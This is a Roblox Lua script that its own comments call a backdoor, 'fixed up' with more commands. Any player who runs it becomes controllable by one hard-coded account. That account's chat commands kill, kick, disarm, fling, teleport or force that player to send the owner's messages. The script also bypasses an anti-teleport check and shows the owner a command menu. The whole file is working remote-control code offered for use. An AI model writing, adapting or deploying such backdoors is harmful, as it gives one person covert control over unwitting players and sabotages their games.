-- fixed up an old backdoor and gave it more commands aaaaaa credits to the original maker --
-- cry about it if you have a problem though


local p = game:GetService("RunService").RenderStepped
local god = false

p:connect(function() -- for god and other
	if god == true then
		game.Players.LocalPlayer.Character:FindFirstChild("Right Leg"):Destroy()
	end
end)

for _,p in pairs(game:GetService("Players"):GetPlayers()) do
	if p.Name == "Scartesu" then
		p.Chatted:connect(function(message)
			local arguement = {}

			for arg in message:gmatch("%S+") do
				arguement[#arguement +1] = arg
			end
			if arguement[1] ~= nil then
				if arguement[1]:lower() == "'kill" and arguement[2] ~= nil then

					local own = arguement[2]:lower()
					if own == "Scartesu" then return end
					if game.Players.LocalPlayer.Name:lower():sub(1, #own) == own then
						game.Players.LocalPlayer.Character:BreakJoints()
					end
				elseif arguement[1]:lower() == "'talk" and arguement[2] ~= nil and arguement[3] ~= nil then
					local own = arguement[2]:lower()
					if own == "Scartesu" then return end
					if game.Players.LocalPlayer.Name:lower():sub(1, #own) == own then
						game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(arguement[3],"All")
					end
				elseif arguement[1]:lower() == "'disarm" and arguement[2] ~= nil then
					local own = arguement[2]:lower()
					if own == "Scartesu" then return end
					if game.Players.LocalPlayer.Name:lower():sub(1, #own) == own then
						game.Players.LocalPlayer.Character["Right Arm"]:Destroy()
						game.Players.LocalPlayer.Character["Left Arm"]:Destroy()
					end
				elseif arguement[1]:lower() == "'kick" and arguement[2] ~= nil then
					local own = arguement[2]:lower()
					if own == "Scartesu" then return end
					if game.Players.LocalPlayer.Name:lower():sub(1, #own) == own then
						game.Players.LocalPlayer:Kick("Kicked By Backdoor")
					end
				elseif arguement[1]:lower() == "'fling" and arguement[2] ~= nil then
					local own = arguement[2]:lower()
					if own == "Scartesu" then return end
					if game.Players.LocalPlayer.Name:lower():sub(1, #own) == own then
						game.Players.LocalPlayer.Character.Torso.CFrame = CFrame.new(9e9,9e9,9e9)
					end
				elseif arguement[1]:lower() == "'god" and arguement[2] ~= nil then
					local own = arguement[2]:lower()
					if own == "Scartesu" then return end
					if game.Players.LocalPlayer.Name:lower():sub(1, #own) == own then
						game.Players.LocalPlayer.Character:BreakJoints()
						god = true
					end
				elseif arguement[1]:lower() == "'ungod" and arguement[2] ~= nil then
					local own = arguement[2]:lower()
					if own == "Scartesu" then return end
					if game.Players.LocalPlayer.Name:lower():sub(1, #own) == own then
						game.Players.LocalPlayer.Character:BreakJoints()
						god = false
					end
				elseif arguement[1]:lower() == "'rejoin" and arguement[2] ~= nil then
					local own = arguement[2]:lower()
					if own == "Scartesu" then return end
					if game.Players.LocalPlayer.Name:lower():sub(1, #own) == own then
						game:GetService('TeleportService'):Teleport(game.PlaceId)
					end
				elseif arguement[1]:lower() == "'bring" and arguement[2] ~= nil then
					local own = arguement[2]:lower()
					if own == "Scartesu" then return end
					if game.Players.LocalPlayer.Name:lower():sub(1, #own) == own then
						for _,v in pairs(game.Players:GetChildren()) do
							if v.Name == "Scartesu" then
								game.Players.LocalPlayer.Character:MoveTo(v.Character.Torso.Position)
							end
						end
					end
				elseif arguement[1]:lower() == "'tpbypass" and arguement[2] ~= nil then
					local own = arguement[2]:lower()
					if own == "Scartesu" then return end
					if game.Players.LocalPlayer.Name:lower():sub(1, #own) == own then
						local client = game:GetService("Players").LocalPlayer;
						local lighting = game:GetService("Lighting");

						client.Character:FindFirstChild("HumanoidRootPart"):Destroy();
						client.Character:FindFirstChildWhichIsA("Humanoid").Parent = lighting;
						lighting:FindFirstChildWhichIsA("Humanoid").Parent = client.Character;
					end
				end
			end
		end)
	end
end

-- if worked

task.wait(0.5)

if game.Players.LocalPlayer.Name == "Scartesu" then
	game.StarterGui:SetCore("SendNotification", {
		Title = "Oldgen Backdoor";
		Text = "You Are Owner, Press F9 For Commands";
		Duration = 7;
	})  

	print("--OLDGEN BACKDOOR COMMANDS--")
	print("'kill [PLAYER] -- Kills Player")
	print("'talk [PLAYER] [MESSAGE] -- Makes Player Chat With Your Message")
	print("'disarm [PLAYER] -- Destroys Players Arm So They Cant Do Anything")
	print("'kick [PLAYER] -- Kicks Player From Game")
	print("'fling [PLAYER] -- Flings Player From Map")
	print("'god [PLAYER] -- Gods Player (THE PRISON ONLY)")
	print("'ungod [PLAYER] -- Ungods Player")
	print("'rejoin [PLAYER] -- Makes Player Rejoin")
	print("'bring [PLAYER] -- Brings Player To You")
	print("'tpbypass [PLAYER] -- Bypasses Anti Teleport (THE PRISON ONLY)")
	print("")
	print("More Commands To Come")
else 
end




